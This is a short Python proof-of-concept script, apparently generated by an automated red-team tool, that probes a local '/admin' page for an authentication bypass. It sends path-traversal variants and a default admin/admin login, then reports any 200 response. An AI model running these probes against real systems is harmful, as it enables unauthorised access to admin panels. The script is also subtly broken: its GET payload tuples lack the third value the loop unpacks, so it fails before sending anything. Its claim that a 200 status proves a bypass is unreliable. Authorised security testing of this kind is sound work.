#!/usr/bin/env python3
"""
PoC: Authentication Bypass - http://localhost:3000/admin
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
The HTTP response indicates a successful authentication bypass, with a status code of 200 OK.
"""

import requests

TARGET = "http://localhost:3000/admin"

def main():
    print("[*] Testing Authentication Bypass on " + TARGET)
    
    # Try common bypass techniques
    payloads = [
        ("GET", TARGET + "/../admin"),
        ("GET", TARGET + "/..;/admin"),
        ("POST", TARGET, {"username": "admin", "password": "admin"}),
    ]
    
    for method, url, data in payloads:
        try:
            if data:
                response = requests.request(method, url, json=data, timeout=10)
            else:
                response = requests.request(method, url, timeout=10)
            
            if response.status_code == 200:
                print("[+] Possible bypass: " + url)
                print("[*] Response: " + response.text[:200])
                
        except Exception as e:
            print("[!] Error with " + url + ": " + str(e))

if __name__ == "__main__":
    main()
